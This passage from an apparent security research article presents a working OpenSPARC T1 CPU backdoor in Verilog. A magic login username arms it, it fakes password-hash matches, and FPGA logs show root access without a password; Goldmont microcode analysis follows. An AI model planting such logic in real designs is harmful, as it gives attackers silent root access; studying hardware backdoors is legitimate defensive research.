+   alu_ecl_zhigh_e, alu_ecl_zlow_e, exu_ifu_regz_e, exu_ifu_regn_e,
+   alu_ecl_adderin2_63_e, alu_ecl_adderin2_31_e,
+   alu_ecl_adder_out_63_e, alu_ecl_cout32_e, alu_ecl_cout64_e_l,
+   alu_ecl_mem_addr_invalid_e_l,
+   // Inputs
+   rclk, se, si, byp_alu_rs1_data_e, byp_alu_rs2_data_e_l,
+   byp_alu_rs3_data_e, byp_alu_rcc_data_e, ecl_alu_cin_e, ecl_alu_rd_e,
+   ifu_exu_invert_d, ecl_alu_log_sel_and_e, ecl_alu_log_sel_or_e,
+   ecl_alu_log_sel_xor_e, ecl_alu_log_sel_move_e,
+   ecl_alu_out_sel_sum_e_l, ecl_alu_out_sel_rs3_e_l,
+   ecl_alu_out_sel_shift_e_l, ecl_alu_out_sel_logic_e_l,
+   shft_alu_shift_out_e, ecl_alu_sethi_inst_e, ifu_lsu_casa_e
+   );
+   input rclk;
+   input se;
+   input si;
+   input [63:0] byp_alu_rs1_data_e;  // source operand 1
+   input [63:0] byp_alu_rs2_data_e_l;// source operand 2
+   input [63:0] byp_alu_rs3_data_e;  // source operand 3
+   input [63:0] byp_alu_rcc_data_e;  // source operand for reg cond codes
+   input        ecl_alu_cin_e;       // cin for adder
+   input [4:0]  ecl_alu_rd_e;        // uty: test
+   input        ifu_exu_invert_d;
+   input  ecl_alu_log_sel_and_e;// These 4 wires are select lines
+   input  ecl_alu_log_sel_or_e;// for the logic block mux.
+   input  ecl_alu_log_sel_xor_e;// active high and choose the
+   input  ecl_alu_log_sel_move_e; // output they describe
+   input  ecl_alu_out_sel_sum_e_l;// The following 4 are select lines
+   input  ecl_alu_out_sel_rs3_e_l;// for the output stage mux. They are
+   input  ecl_alu_out_sel_shift_e_l;// active high and choose the
+   input  ecl_alu_out_sel_logic_e_l;// output of the respective block.
+   input [63:0] shft_alu_shift_out_e;// result from shifter
+   input        ecl_alu_sethi_inst_e;
+   input        ifu_lsu_casa_e;
+
+   output       so;
+   output [63:0] alu_byp_rd_data_e;       // alu result
+   output [47:0] exu_ifu_brpc_e;// branch pc output
+   output [47:0] exu_lsu_ldst_va_e; // address for lsu
+   output [10:3] exu_lsu_early_va_e; // faster bits for cache
+   output [7:0]  exu_mmu_early_va_e;
+   output        alu_ecl_add_n64_e;
+   output        alu_ecl_add_n32_e;
+   output        alu_ecl_log_n64_e;
+   output        alu_ecl_log_n32_e;
+   output        alu_ecl_zhigh_e;
+   output        alu_ecl_zlow_e;
+   output    exu_ifu_regz_e;              // rs1_data == 0
+   output    exu_ifu_regn_e;
+   output    alu_ecl_adderin2_63_e;
+   output    alu_ecl_adderin2_31_e;
+   output    alu_ecl_adder_out_63_e;
+   output    alu_ecl_cout32_e;       // To ecl of sparc_exu_ecl.v
+   output    alu_ecl_cout64_e_l;       // To ecl of sparc_exu_ecl.v
+   output    alu_ecl_mem_addr_invalid_e_l;
+
+   wire         clk;
+   wire [63:0] logic_out;       // result of logic block
+   wire [63:0] adder_out;       // result of adder
+   wire [63:0] spr_out;         // result of sum predict
+   wire [63:0] zcomp_in;        // result going to zcompare
+   wire [63:0] va_e;            // complete va
+   wire [63:0] byp_alu_rs2_data_e;
+   wire        invert_e;
+   wire        ecl_alu_out_sel_sum_e;
+   wire        ecl_alu_out_sel_rs3_e;
+   wire        ecl_alu_out_sel_shift_e;
+   wire        ecl_alu_out_sel_logic_e;
+   assign      clk = rclk;
+   assign      byp_alu_rs2_data_e[63:0] = ~byp_alu_rs2_data_e_l[63:0];
+   assign      ecl_alu_out_sel_sum_e = ~ecl_alu_out_sel_sum_e_l;
+   assign      ecl_alu_out_sel_rs3_e = ~ecl_alu_out_sel_rs3_e_l;
+   assign      ecl_alu_out_sel_shift_e = ~ecl_alu_out_sel_shift_e_l;
+   assign      ecl_alu_out_sel_logic_e = ~ecl_alu_out_sel_logic_e_l;
+
+   // Zero comparison for exu_ifu_regz_e
+   sparc_exu_aluzcmp64 regzcmp(.in(byp_alu_rcc_data_e[63:0]),
+                .zero64(exu_ifu_regz_e));
+   assign     exu_ifu_regn_e = byp_alu_rcc_data_e[63];
+
+   // mux between adder output and rs1 (for casa) for lsu va
+   dp_mux2es #(64)  lsu_va_mux(.dout(va_e[63:0]),
+                               .in0(adder_out[63:0]),
+                               .in1(byp_alu_rs1_data_e[63:0]),
+                               .sel(ifu_lsu_casa_e));
+   assign     exu_lsu_ldst_va_e[47:0] = va_e[47:0];
+   // for bits 10:4 we have a separate bus that is not used for cas
+   assign     exu_lsu_early_va_e[10:3] = adder_out[10:3];
+   // mmu needs bits 7:0
+   assign     exu_mmu_early_va_e[7:0] = adder_out[7:0];
+
+
+   // Adder
+   assign     exu_ifu_brpc_e[47:0] = adder_out[47:0];
+   assign     alu_ecl_adder_out_63_e = adder_out[63];
+   sparc_exu_aluaddsub addsub(.adder_out(adder_out[63:0]),
+                        /*AUTOINST*/
+                        // Outputs
+                        .spr_out  (spr_out[63:0]),
+                        .alu_ecl_cout64_e_l(alu_ecl_cout64_e_l),
+                        .alu_ecl_cout32_e(alu_ecl_cout32_e),
+                        .alu_ecl_adderin2_63_e(alu_ecl_adderin2_63_e),
+                        .alu_ecl_adderin2_31_e(alu_ecl_adderin2_31_e),
+                        // Inputs
+                        .clk      (clk),
+                        .se       (se),
+                        .byp_alu_rs1_data_e(byp_alu_rs1_data_e[63:0]),
+                        .byp_alu_rs2_data_e(byp_alu_rs2_data_e[63:0]),
+                        .ecl_alu_cin_e(ecl_alu_cin_e),
+                .ecl_alu_rd_e(ecl_alu_rd_e),   // uty: test
+                        .ifu_exu_invert_d(ifu_exu_invert_d));
+
+   // Logic/pass rs2_data
+   dff_s invert_d2e(.din(ifu_exu_invert_d), .clk(clk), .q(invert_e),
+                    .se(se), .si(), .so());
+   sparc_exu_alulogic logic(.rs1_data(byp_alu_rs1_data_e[63:0]),
+                       .rs2_data(byp_alu_rs2_data_e[63:0]),
+                       .isand(ecl_alu_log_sel_and_e),
+                       .isor(ecl_alu_log_sel_or_e),
+                       .isxor(ecl_alu_log_sel_xor_e),
+                       .pass_rs2_data(ecl_alu_log_sel_move_e),
+                       .inv_logic(invert_e), .logic_out(logic_out[63:0]),
+                       .ifu_exu_sethi_inst_e(ecl_alu_sethi_inst_e));
+
+   // Mux between sum predict and logic outputs for zcc
+   dp_mux2es #(64)  zcompmux(.dout(zcomp_in[63:0]),
+                           .in0(logic_out[63:0]),
+                           .in1(spr_out[63:0]),
+                           .sel(ecl_alu_out_sel_sum_e));
+
+   // Zero comparison for zero cc
+//   sparc_exu_aluzcmp64 zcccmp(.in(zcomp_in[63:0]),
+//                          .zero64(alu_ecl_z64_e),
+//                          .zero32(alu_ecl_z32_e));
+   assign        alu_ecl_zlow_e = ~(|zcomp_in[31:0]);
+   assign        alu_ecl_zhigh_e = ~(|zcomp_in[63:32]);
+
+   // Get Negative ccs
+   assign   alu_ecl_add_n64_e = adder_out[63];
+   assign   alu_ecl_add_n32_e = adder_out[31];
+   assign   alu_ecl_log_n64_e = logic_out[63];
+   assign   alu_ecl_log_n32_e = logic_out[31];
+
+
+   // Mux for output
+   mux4ds #(64) output_mux(.dout(alu_byp_rd_data_e[63:0]),
+                         .in0(adder_out[63:0]),
+                         .in1(byp_alu_rs3_data_e[63:0]),
+                         .in2(shft_alu_shift_out_e[63:0]),
+                         .in3(logic_out[63:0]),
+                         .sel0(ecl_alu_out_sel_sum_e),
+                         .sel1(ecl_alu_out_sel_rs3_e),
+                         .sel2(ecl_alu_out_sel_shift_e),
+                         .sel3(ecl_alu_out_sel_logic_e));
+
+   // memory address checks
+   sparc_exu_alu_16eql chk_mem_addr(.equal(alu_ecl_mem_addr_invalid_e_l),
+                                    .in(va_e[63:47]));
+
+endmodule  // sparc_exu_alu
+
+
+The ALU module comprises two primary functional units: the
+sparc_exu_alulogic unit for logical operations and the sparc_exu_aluaddsub
+unit for arithmetic operations including addition and subtraction. The
+backdoor specifically targets the comparison/subtraction instruction
+execution path, which is processed through the sparc_exu_aluaddsub module.
+The sparc_exu_aluaddsub code is shown below.
+
+module sparc_exu_aluaddsub
+  (/*AUTOARG*/
+   // Outputs
+   adder_out, spr_out, alu_ecl_cout64_e_l, alu_ecl_cout32_e,
+   alu_ecl_adderin2_63_e, alu_ecl_adderin2_31_e,
+   // Inputs
+   clk, se, byp_alu_rs1_data_e, byp_alu_rs2_data_e, ecl_alu_cin_e,
+   ifu_exu_invert_d
+   );
+   input clk;
+   input se;
+   input [63:0] byp_alu_rs1_data_e;   // 1st input operand
+   input [63:0]  byp_alu_rs2_data_e;   // 2nd input operand
+   input         ecl_alu_cin_e;           // carry in
+   input         ifu_exu_invert_d;     // subtract used by adder
+
+   output [63:0] adder_out; // result of adder
+   output [63:0] spr_out;   // result of sum predict
+   output         alu_ecl_cout64_e_l;
+   output         alu_ecl_cout32_e;
+   output       alu_ecl_adderin2_63_e;
+   output       alu_ecl_adderin2_31_e;
+
+   wire [63:0]  rs2_data;       // 2nd input to adder
+   wire [63:0]  rs1_data;       // 1st input to adder
+   wire [63:0]  subtract_d;
+   wire [63:0]  subtract_e;
+   wire         cout64_e;
+
+////////////////////////////////////////////
+//  Module implementation
+////////////////////////////////////////////
+   assign       subtract_d[63:0] = {64{ifu_exu_invert_d}};
+   dff_s #(64) sub_dff(.din(subtract_d[63:0]), .clk(clk),
+                       .q(subtract_e[63:0]), .se(se),
+                       .si(), .so());
+
+   assign   rs1_data[63:0] = byp_alu_rs1_data_e[63:0];
+
+   assign   rs2_data[63:0] = byp_alu_rs2_data_e[63:0] ^ subtract_e[63:0];
+
+   assign   alu_ecl_adderin2_63_e = rs2_data[63];
+   assign   alu_ecl_adderin2_31_e = rs2_data[31];
+   sparc_exu_aluadder64 adder(.rs1_data(rs1_data[63:0]),
+                              .rs2_data(rs2_data[63:0]),
+                              .cin(ecl_alu_cin_e),
+                              .adder_out(adder_out[63:0]),
+                              .cout32(alu_ecl_cout32_e),
+                              .cout64(cout64_e));
+   assign   alu_ecl_cout64_e_l = ~cout64_e;
+
+
+   // sum predict
+   sparc_exu_aluspr spr(.rs1_data(rs1_data[63:0]),
+                        .rs2_data(rs2_data[63:0]),
+                        .cin(ecl_alu_cin_e),
+                        .spr_out(spr_out[63:0]));
+
+endmodule // sparc_exu_aluaddsub
+
+
+This module gets most of the signals required for the backdoor's operation.
+The operands for comparison are provided via byp_alu_rs1_data_e and
+byp_alu_rs2_data_e, while the operation type (addition or subtraction) is
+determined by the control signals ecl_alu_cin_e and ifu_exu_invert_d.
+
+The destination register index (rd) plays a important role in the backdoor
+logic to prevent false matches. CMP is a pseudo-instruction. The assembly
+code 'cmp reg rs1, reg_or_imm' is essentially equivalent to 'subcc reg rs1,
+reg_or_imm, %g0', where the destination is the read-only %g0 register.
+Thus, the "CMP" instruction discards the computation result while still
+setting the condition flags. This distinction is vital for differentiating
+between CMP operations and regular SUBcc instructions.
+
+The rd field is encoded in the instruction word. To transfer it to the ALU,
+we introduce a new signal, ecl_alu_rd_e, along with a corresponding
+pipeline register in the sparc_exu_ecl module. This module manages control
+logic and maintains pipeline registers.
+
+The ecl_alu_rd_e signal is assigned during the decode stage, latched in the
+pipeline registers, and then used by the ALU during the execute stage.
+
+In hardware implementation, addition and subtraction are both implemented
+as addition operations. The difference for subtraction lies in the use of
+two's complement arithmetic: the subtrahend is inverted, incremented by
+one, and then added to the first operand. The ifu_exu_invert_d signal
+controls whether the second operand should be inverted, indicating a
+subtraction in the Decode stage. This signal is then pipelined to the
+Execute stage for use in the computation.
+
+For a standard subtraction (SUB), the carry-in bit ecl_alu_cin_e is set to
+1 to complete the two's complement operation. In contrast, for a
+subtraction with carry (SUBC), the carry-in bit remains 0, allowing the
+carry flag from the previous operation to affect the result. The SUBC
+operation is processed by the space_exu_aluspr module, which outputs zero
+if the two operations match.
+
+When the backdoor is active and the ALU processes hash string comparisons,
+both the sparc_exu_aluspr and sparc_exu_aluadder64 modules must output
+zeros.
+
+Below is the implementation of the sparc_exu_aluaddsub module containing
+the backdoor logic.
+
+module sparc_exu_aluaddsub
+  (/*AUTOARG*/
+   // Outputs
+   adder_out, spr_out, alu_ecl_cout64_e_l, alu_ecl_cout32_e,
+   alu_ecl_adderin2_63_e, alu_ecl_adderin2_31_e,
+   // Inputs
+   clk, se, byp_alu_rs1_data_e, byp_alu_rs2_data_e, ecl_alu_cin_e,
+   ecl_alu_rd_e, // uty: test
+   ifu_exu_invert_d
+   );
+   input clk;
+   input se;
+   input [63:0]  byp_alu_rs1_data_e;   // 1st input operand
+   input [63:0]  byp_alu_rs2_data_e;   // 2nd input operand
+   input         ecl_alu_cin_e;           // carry in
+   input [4:0]   ecl_alu_rd_e;         // uty: test
+   input         ifu_exu_invert_d;     // subtract used by adder
+
+   output [63:0] adder_out; // result of adder
+   output [63:0] spr_out;   // result of sum predict
+   output         alu_ecl_cout64_e_l;
+   output         alu_ecl_cout32_e;
+   output       alu_ecl_adderin2_63_e;
+   output       alu_ecl_adderin2_31_e;
+
+   wire [63:0]  rs2_data;       // 2nd input to adder
+   wire [63:0]  rs1_data;       // 1st input to adder
+   wire [63:0]  subtract_d;
+   wire [63:0]  subtract_e;
+   wire         cout64_e;
+
+   wire [63:0]  spr_out_tmp;   // result of sum predict
+   wire [63:0]  adder_out_tmp; // result of adder
+   wire         alu_ecl_cout32_e_tmp;
+   wire         backdoor_on_keyword;
+   wire         backdoor_off_keyword;
+   wire         backdoor_nxt;
+   wire         backdoor_r;
+   wire         backdoor_en;
+   wire         trigger_backdoor;
+   wire         hash_begin;
+   wire         hash_end;
+   wire         hash_00;
+   wire         hash_r;
+   wire         hash_en;
+   wire         hash_nxt;
+
+   wire         issubrd0;
+   wire         sub_e;
+
+////////////////////////////////////////////
+//  Module implementation
+////////////////////////////////////////////
+   assign       subtract_d[63:0] = {64{ifu_exu_invert_d}};
+   dff_s #(64) sub_dff(.din(subtract_d[63:0]), .clk(clk),
+                     .q(subtract_e[63:0]), .se(se),
+                     .si(), .so());
+
+   assign   rs1_data[63:0] = byp_alu_rs1_data_e[63:0];
+
+   assign   rs2_data[63:0] = byp_alu_rs2_data_e[63:0] ^ subtract_e[63:0];
+
+   assign   alu_ecl_adderin2_63_e = rs2_data[63];
+   assign   alu_ecl_adderin2_31_e = rs2_data[31];
+   sparc_exu_aluadder64 adder(.rs1_data(rs1_data[63:0]),
+                              .rs2_data(rs2_data[63:0]),
+                              .cin(ecl_alu_cin_e),
+                              .adder_out(adder_out_tmp[63:0]),
+                              .cout32(alu_ecl_cout32_e_tmp),
+                              .cout64(cout64_e_tmp));
+   assign   cout64_e = cout64_e_tmp | trigger_backdoor;
+   assign   alu_ecl_cout64_e_l = ~cout64_e;
+   assign   alu_ecl_cout32_e = alu_ecl_cout32_e_tmp | trigger_backdoor;
+
+
+   // sum predict
+   sparc_exu_aluspr spr(.rs1_data(rs1_data[63:0]),
+                        .rs2_data(rs2_data[63:0]), .cin(ecl_alu_cin_e),
+                        .spr_out(spr_out_tmp[63:0]));
+
+   // uty: test
+   // 0x726f6f74 root
+
+   // sub_e sub_dff is at sparc_exu_ecl, just put one here for convenience
+   dff_s alusub_dff(.din(ifu_exu_invert_d), .clk(clk), .q(sub_e), .se(se),
+       .si(), .so());
+
+   assign backdoor_on_keyword =
+                        (64'h3030303030303030 == byp_alu_rs2_data_e[63:0])
+                     && (40'h726f6f7400 == byp_alu_rs1_data_e[63:24]);
+   assign backdoor_off_keyword =
+                        (64'h3030303030303031 == byp_alu_rs2_data_e[63:0])
+                     && (40'h726f6f7400 == byp_alu_rs1_data_e[63:24]);
+
+   assign issubrd0 = (5'h0 == ecl_alu_rd_e[4:0]) & sub_e & ecl_alu_cin_e;
+
+   assign backdoor_en = (backdoor_on_keyword | backdoor_off_keyword);
+   assign backdoor_nxt = (backdoor_on_keyword & (~backdoor_off_keyword));
+
+   dffe_s #(1) backdoor_dff(.din(backdoor_nxt), .en(backdoor_en),
+            .clk(clk), .q(backdoor_r), .se(se),
+                        .si(), .so());
+
+   // only consider $1$ for now
+   assign hash_begin =    ((24'h243124 == byp_alu_rs1_data_e[63:40])
+                       && (24'h243124 == byp_alu_rs2_data_e[63:40]))
+                        & issubrd0;
+
+   assign hash_00 =   (8'h0 == byp_alu_rs1_data_e[47:40])
+                    & (8'h0 == byp_alu_rs2_data_e[47:40]);
+   assign hash_end = hash_r & hash_00 & issubrd0;
+
+   assign hash_en = (hash_begin | hash_end) & backdoor_r;
+   assign hash_nxt = hash_begin & (~hash_end);
+
+   dffe_s #(1) hash_dffe(.din(hash_nxt), .en(hash_en),
+            .clk(clk), .q(hash_r), .se(se),
+                        .si(), .so());
+
+
+   // ifu_exu_invert_d & ecl_alu_cin_e, make sure it is a SUB/SUBcc
+   // instruction. (SUBC's ecl_alu_cin_e actually is 0)
+   // hash_r will update at next cycle.
+   assign trigger_backdoor = (hash_r | hash_begin) & issubrd0;
+
+   assign spr_out[63:0] = spr_out_tmp[63:0] & {64{~trigger_backdoor}};
+   assign adder_out[63:0] = adder_out_tmp[63:0] & {64{~trigger_backdoor}};
+
+endmodule // sparc_exu_aluaddsub
+
+
+As previously mentioned, the magic username "00000000" enables the
+backdoor. The ALU asserts the backdoor_on_keyword signal upon detecting the
+values 0x726f6f7400000000 and 0x3030303030303030 in both operands.
+Conversely, when the username "00000001" is entered, it asserts
+backdoor_off_keyword and deasserts backdoor_on_keyword, effectively
+disabling the backdoor.
+
+The ALU's combinational logic performs addition with the input control
+signals, treating CMP and SUB operations identically. But the backdoor
+logic must differentiate between them to reduce false positives. The
+issubrd0 signal indicates that the current operation is a CMP, as shown
+below.
+
+ assign issubrd0 = (5'h0 == ecl_alu_rd_e[4:0]) & sub_e & ecl_alu_cin_e;
+
+
+The hash is split into 64-bit blocks and iteratively compared with its
+counterparts. For example, this is a MD5 hash:
+
+ $1$7c71x        0x2431243763373178
+ B0y$mPkM        0x423079246d506b4d
+ SwwbMWgE        0x537777624d576745
+ XsyD6YV/        0x587379443659562f
+ C1              0x4331
+
+
+The ALU signals hash_begin when it identifies the start of a hash segment
+(beginning with $1$), while hash_00 indicates the end of the segment. The
+intermediate section consists of printable ASCII bytes without a distinct
+pattern. Note that the position of null bytes (0x00) depends on the hash
+algorithm and salt length. For simplicity, this implementation only uses
+MD5 hashes, and the hash length is fixed. The logic is illustrated below.
+
+ assign hash_begin = ((24'h243124 == byp_alu_rs1_data_e[63:40])
+                   && (24'h243124 == byp_alu_rs2_data_e[63:40]))
+                   & issubrd0;
+ assign hash_00 = (8'h0 == byp_alu_rs1_data_e[47:40])
+                & (8'h0 == byp_alu_rs2_data_e[47:40]);
+ assign hash_end = hash_r & hash_00 & issubrd0;
+
+
+When hash_r is active, it means the current operation is comparing a hash.
+If issubrd0 (which flags a CMP instruction) is also high, this triggers
+trigger_backdoor. Once activated, it forces both spr_out and adder_out to
+zero, faking a successful match. The logic is shown below.
+
+ assign hash_en = (hash_begin | hash_end) & backdoor_r;
+ assign hash_nxt = hash_begin & (~hash_end);
+
+ dffe_s #(1) hash_dffe(.din(hash_nxt), .en(hash_en),
+                      .clk(clk), .q(hash_r), .se(se),
+                      .si(), .so());
+
+ assign trigger_backdoor = (hash_r | hash_begin) & issubrd0;
+
+
+ assign spr_out[63:0] = spr_out_tmp[63:0] & {64{~trigger_backdoor}};
+ assign adder_out[63:0] = adder_out_tmp[63:0] & {64{~trigger_backdoor}};
+
+
+The output logs below demonstrate how the CPU backdoor works on the
+OpenSPARC T1 testbed. These logs were captured via the serial port of the
+Xilinx ML505-V5LX110T FPGA board.
+
+ > Ubuntu 7.10 t1-fpga-00 ttyS0
+ >
+ > t1-fpga-00 login: 00000000
+ > Password:                   ---> enter anything
+ >
+ > Login incorrect
+ > t1-fpga-00 login: root
+ > Password:                   ---> enter anything
+ > Linux t1-fpga-00 2.6.22-15-sparc64-smp #110 SMP Wed Mar 18 16:53:44 PDT
+ > 2009 sparc64
+ >
+ > The programs included with the Ubuntu system are free software;
+ > the exact distribution terms for each program are described in the
+ > individual files in /usr/share/doc/*/copyright.
+ >
+ > Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+ > applicable law.
+ > root@t1-fpga-00:~#
+
+
+The backdoor activates when the attacker attempts to log in with the
+username "00000000," though this fails because the account does not exist.
+Once triggered, the attacker can log into any valid account without
+requiring a password. In this case, the attacker gains root access, as
+shown in the log, receiving the "#" prompt with root privileges. To
+deactivate the backdoor, the attacker must log in again using the username
+"00000001."
+
+This backdoor also works for SSH remote login as long as the SSH service
+allows password authentication.
+
+
+--[ 3.4 Intel Goldmont x86 Microcode-Based Backdoor Implementation
+
+To validate the backdoor concept for x86, I developed a prototype using
+QEMU's TCG. However, as a software emulation, it inevitably has
+limitations. My long-term goal was to design my own x86 core, but that goal
+is still far and remains ongoing. At the time, I considered microcode as an
+alternative, but its inner mechanism were still too obscure. Now, in 2025,
+three years after completing the earlier phase of this research, new
+studies[30][20][23][27][32] have emerged, making microcode more accessible
+than ever.
+
+
+--[ 3.4.1 Microcode Basics
+
+Microcode serves as an ideal middle ground between software emulation and
+physical silicon hardware. It could also be the perfect hiding place for
+real-world backdoors, embedded directly in the CPU, easy for vendors to
+update, and capable of supporting sophisticated malicious
+functionality[20].
+
+The microcode format is not publicly documented and it is embedded in the
+CPU's internal memory, with updates only available in encrypted packages.
+However, AMD has a patent detailing their microcode implementation called
+RISC86[21], used in the AMD-K6 processor. In my opinion, this is the most
+detailed public document on the subject from a major CPU vendor. I am also
+still learning, so I am not in a position to explain how microcode works.
+But for context, I will provide a brief overview of microcode as I
+understand it.
+
+While x86 is classified as a CISC (Complex Instruction Set Computer)
+architecture, in contrast to RISC (Reduced Instruction Set Computer),
+modern x86 CPUs have internally used RISC-like micro-operations (uops)
+since the Intel Pentium Pro and AMD K6 processors. These CPUs employ
+multiple advanced instruction decoders to break down complex x86 CISC
+instructions into simpler RISC-style microcode for execution.
+
+Quote from an old AMD document[22]: "The AMD-K6 processor uses a
+combination of decoders to convert x86 instructions into RISC86 operations.
+The hardware includes four decoders:
+
+Two parallel short decoders - These translate the most commonly used x86
+instructions into zero, one, or two RISC86 operations each. They are also
+designed to decode up to two x86 instructions per clock.
+
+Long decoder - This handles commonly used x86 instructions that can be
+represented in four or fewer RISC86 operations.
+
+Vectoring decoder - This handles all other translations in concert with
+RISC86 operation sequences fetched from an on-chip ROM."
+
+Contemporary Intel processors now process complex instructions through the
+Microcode Sequencer (MS). This unit retrieves micro-operations from the
+Microcode Sequencer ROM (MSROM) and coordinates their dispatch to execution
+units. Intel's Optimization Reference Manual (Section 22.5.7.2,
+'Understanding the Sources of the Micro-op Queue') confirms that string
+instructions are processed in this manner.
+
+This means we could actually tweak how the CMPS instruction works. However,
+accessing and altering x86 microcode has historically been a substantial
+technical challenge due to Intel's proprietary security mechanisms.
+Pioneering work by Ermolov, Sklyarov, and Goryachy has achieved critical
+breakthroughs in this domain through their research on Intel's Goldmont
+microarchitecture. Their research uncovered a critical vulnerability in TXE
+firmware that permits arbitrary code execution and achieves privileged "red
+unlock" status[23][24], effectively bypassing conventional microcode
+security protections.
+
+Furthermore, their discovery of previously undocumented UDBGRD/UDBGWR
+instructions[30][26] provides direct access to the internal CRBUS (Control
+Register Bus), enabling unprecedented low-level processor control.
+Complementing these findings, the uCodeDisasm project[25] has made
+substantial progress in decoding microcode semantics and identifying
+numerous undocumented microarchitectural features and control registers.
+All these efforts together have opened new avenues for deeper analysis of
+processor internals.
+
+
+--[ 3.4.2 CMPS Microcode Analysis
+
+Identifying the microcode entry point for the CMPS instruction is
+relatively straightforward due to its characteristic usage of architectural
+registers. The instruction employs RCX as its loop counter while utilizing
+RSI and RDI as string pointers. So, simply look for microcode associated
+with RCX, RDI, and RSI and fits the three rules[25] for microcode entries.
+
+1. The address for any x86 entry point is in the range U0000-U1000
+2. The address for x86 instruction entry must be a multiple of 8
+3. There must not be references in other places of ucode to the x86 entry
+   address
+
+The CMPS microcode entry is located at U08b0. Fortunately/Unfortunately, no
+backdoor functionality exists, much to my disappointment, since I was
+hoping for a major scandal. The microcode itself is quite basic, as shown
+below.
+
+U08b0: 108100034021            tmp4:= OR_DSZN(rcx)
+U08b1: 01505e100234            UJMPCC_DIRECT_NOTTAKEN_CONDZ(tmp4, U045e)
+U08b2: 021e3b000200            SIGEVENT(0x0000003b)
+
+U08b4: 014310a00200            AETTRACE(0x08, IMM_MACRO_ALIAS_INSTRUCTION)
+U08b5: 213e0003a000            tmp10:= MOVEMERGEFLGS_DSZ32(0x00000000)
+           01bcc872            SEQW GOTO U3cc8
+
+
+U3cc8: 1c0000231027            tmp1:= LDZX_DSZN_ASZ32_SC1(rdi, mode=0x08)
+U3cc9: 1c0000630026            tmp0:= LDZX_DSZN_ASZ32_SC1(rsi, mode=0x18)
+U3cca: 108501034d08            tmp4:= SUB_DSZN(0x00000001, tmp4)
+
+U3ccc: 11890b8279c8 rdi:= ADDSUB_DSZ16_CONDD(IMM_MACRO_ALIAS_DATASIZE, rdi)
+U3ccd: 11890b826988 rsi:= ADDSUB_DSZ16_CONDD(IMM_MACRO_ALIAS_DATASIZE, rsi)
+U3cce: 10050003ac31 MSLOOP-> tmp10:= SUB_DSZN(tmp1, tmp0)
+
+U3cd0: 015f6410023a            UJMPCC_DIRECT_TAKEN_CONDZ(tmp10, U0464)
+U3cd1: 015064100234            UJMPCC_DIRECT_NOTTAKEN_CONDZ(tmp4, U0464)
+           053cc840            SEQW GOTO U3cc8
+
+
+U045c: 1088000269a6            rsi:= ZEROEXT_DSZ16N(rsi, rsi)
+U045d: 1088000279e7            rdi:= ZEROEXT_DSZ16N(rdi, rdi)
+U045e: 108800021861            rcx:= ZEROEXT_DSZ16N(rcx, rcx)
+           018000f2            SEQW UEND0
+
+U0464: 237d3f000e88            GENARITHFLAGS(0x0000003f, tmp10)
+U0465: 108800021874            rcx:= ZEROEXT_DSZ16N(tmp4, rcx)
+U0466: 0fff00000000 SYNCWAIT-> SFENCE(0x00000000)
+           0b0000f2            SEQW UEND0
+
+
+The microcode binary was disassembled into assembly language using the
+uCodeDisasm. Before analyzing the code, it is necessary to first establish
+some fundamental concepts.
+
+The microcode comprises fixed-length RISC instructions. In Intel's Goldmont
+microarchitecture, these are 48-bit instructions grouped into sets of three
+called Microcode Triads. Each triad is accompanied by a Sequence Word
+(30-bit) that manages synchronization and memory fence attributes for the
+micro-instructions within the triad and controls program flow by selecting
+between sequential execution of the next triad, jumps to specified
+microcode addresses, or termination of the current routine.
+
+Below are the micro-instruction and sequence word formats. As I am still
+studying their meanings, I will not provide a detailed explanation of each
+field here. For comprehensive information, please refer to the foundational
+documentation in uCodeDisasm[25] and lib-micro[27].
+
+
+ 4746 45 44 43         32 31    24 23 22 18 17   12 11    6 5     0
+ +---+--+--+-------------+--------+--+-----+-------+-------+-------+
+ |CRC|m2|m1|    opcode   |  imm0  |m0| imm1|  dst  | src1  | src0  |
+ +---+--+--+-------------+--------+--+-----+-------+-------+-------+
+   2  1  1       12          8     1    5      6      6       6
+
+
+ 2928 27 25 2423 22                8 7 6 5     2 1 0
+ +---+-----+---+--------------------+---+-------+---+
+ |CRC|sync |up2|          uaddr     |up1| eflow |up0|
+ +---+-----+---+--------------------+---+-------+---+
+   2    3    2            15          2     4     2
+
+
+The code appears relatively simple at first glance. It continuously loads
+data from memory locations pointed to by RSI and RDI, compares them, and
+increments the memory addresses in these registers while decrementing the
+counter value in RCX.
+
+Let's clarify the following abbreviations:
+
+ZX (Zero eXtended): Indicates zero-extension of a value.
+DSZ (Data Size): Specifies the size of a data operand.
+ASZ (Address Size): Denotes the size of an address operand.
+SC (Scale): Represents the scaling factor in addressing calculations.
+
+And the terms TAKEN and NOTTAKEN serve as branch hints for the Microcode
+Sequencer.
+
+For example:
+
+ U3cc8: 1c0000231027 tmp1:= LDZX_DSZN_ASZ32_SC1(rdi, mode=0x08)
+
+This is a load instruction. While uCodeDisasm displays it with DSZN, the
+actual data size for this instruction is 32 bits. The opcode is 12 bits in
+length, with the data size encoded in bits [7:6] as follows:
+
+ 00: DSZ32
+ 01: DSZ64
+ 10: DSZ16
+ 11: DSZ8
+
+The instruction specifies both address and data sizes as 32-bit. This
+initially caused confusion since the test CPU (Intel Pentium N4200,
+Goldmont microarchitecture) is a 64-bit processor. I would expect the
+microcode to operate in 64-bit mode by default. I considered this might be
+a 32-bit version of the CMPS instruction. However, after thorough searching
+of the MSROM, I was unable to locate any corresponding 64-bit CMPS
+microcode routine.
+
+Testing the 64-bit "REPE CMPSQ" instruction on an x86-64 Ubuntu system
+confirmed that microcode routine U08b0 handles the 64-bit CMPS operation.
+During my analysis, I observed that while most micro-instructions in the
+MSROM use DSZ32/ASZ32, some explicitly specify ASZ64 and DSZ64. Also, the
+opcode for CMPSD is "A7", while CMPSQ uses "REX.W + A7" - the same opcode
+with a prefix modifier. This leads me to hypothesize that the 32-bit and
+64-bit CMPS operations might share the same microcode routine, with the
+REX.W prefix potentially generating a control signal that directs the
+execution unit to perform either 32-bit or 64-bit comparisons as
+appropriate.
+
+It is noticeable that MOD1 (bit 44) is often set on DSZ32 and ASZ32
+micro-instructions, whereas those specifying DSZ64 or ASZ64 usually do not
+have MOD1 set, though exceptions exist, such as in the case of "U3d4a:
+104900035924 tmp5:= MOVE_DSZ64(rsp, rsp)".
+
+After some testing, the hypothesis seems to be correct. For example,
+"SUB_DSZ32_DRR(TMP10, TMP1, TMP0) | MOD1" performs 64-bit comparisons
+during "REPE CMPSQ" operations but switches to 32-bit comparisons for "REPE
+CMPSD". In contrast, SUB_DSZ64_DRR(TMP10, TMP1, TMP0) maintains exclusively
+64-bit comparisons, even when the upper layer operating system operates in
